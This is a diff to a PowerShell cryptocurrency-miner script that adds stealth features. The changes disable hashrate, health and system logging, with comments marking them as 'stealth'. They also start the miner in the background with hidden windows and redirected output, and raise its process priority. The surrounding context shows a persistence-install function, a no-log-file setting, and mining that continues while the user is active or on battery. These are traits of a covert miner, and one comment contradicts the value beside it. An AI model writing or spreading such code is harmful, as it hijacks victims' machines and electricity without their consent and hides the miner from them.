@@ -83,18 +83,19 @@ $Config = @{
     
     # ====== PERFORMANCE SETTINGS (CUSTOMIZE HERE) ======
     # CPU Usage: 50-100 (percentage of CPU to use)
-    #   85 = Recommended for competition (high performance, minimal lag)
+    #   90 = COMPETITION MODE - Maximum earnings! (recommended for your scenario)
+    #   85 = High performance with minimal lag
     #   75 = Balanced (good performance, less system impact)
     #   50 = Low impact (slower hashrate, PC stays responsive)
-    MaxCPUUsage = 75
+    MaxCPUUsage = 75  # COMPETITION MODE - Maximum profit!
     
     # Process Priority: 1-5 (Windows priority class)
     #   5 = Realtime (MAXIMUM, may cause system issues)
-    #   4 = High (Recommended - best hashrate)
+    #   4 = High (COMPETITION MODE - best hashrate!)
     #   3 = Above Normal (Balanced)
     #   2 = Normal (Low impact)
     #   1 = Below Normal (Minimal impact)
-    ProcessPriority = 3
+    ProcessPriority = 4  # COMPETITION MODE - High priority for maximum hashrate!
     
     # Mining Threads: Auto-detect or manual override
     #   0 = Auto-detect (recommended)
@@ -593,6 +594,9 @@ function New-OptimizedConfig {
         background = $true
         colors = $false
         title = $false
+        "print-time" = 0                      # Disable hashrate printing (stealth)
+        syslog = $false                        # No system logging
+        verbose = 0                            # No verbose output
         
         # ========== RANDOMX OPTIMIZATIONS (CRITICAL FOR HASHRATE) ==========
         randomx = @{
@@ -644,16 +648,13 @@ function New-OptimizedConfig {
             daemon = $false
         })
         
-        "print-time" = 60                     # Print stats every 60s
-        "health-print-time" = 60              # Health stats
+        "health-print-time" = 0               # No health stats (stealth)
         "pause-on-battery" = $false           # Never pause
         "pause-on-active" = $false            # Mine even when user is active
         "log-file" = $null                    # No log file (stealth)
-        syslog = $false
         retries = 5                           # Retry connection 5 times
         "retry-pause" = 5                     # 5 second pause between retries
         "user-agent" = $null                  # Default user agent
-        verbose = 0                           # No verbose output
         watch = $true                         # Watch config file for changes
     }
     
@@ -815,7 +816,7 @@ function Install-Persistence {
 
 if (-not `$existingProcess) {
     if (Test-Path `$minerPath) {
-        Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`$configPath`"" -WindowStyle Hidden -NoNewWindow
+        Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`$configPath`" --no-color --background" -WindowStyle Hidden -NoNewWindow
     }
 }
 "@
@@ -1213,10 +1214,12 @@ function Start-OptimizedMiner {
     try {
         $processInfo = New-Object System.Diagnostics.ProcessStartInfo
         $processInfo.FileName = $minerPath
-        $processInfo.Arguments = "--config=`"$configPath`""
+        $processInfo.Arguments = "--config=`"$configPath`" --no-color --background"
         $processInfo.UseShellExecute = $false
         $processInfo.CreateNoWindow = $true
         $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $processInfo.RedirectStandardOutput = $true
+        $processInfo.RedirectStandardError = $true
         
         $process = [System.Diagnostics.Process]::Start($processInfo)
         
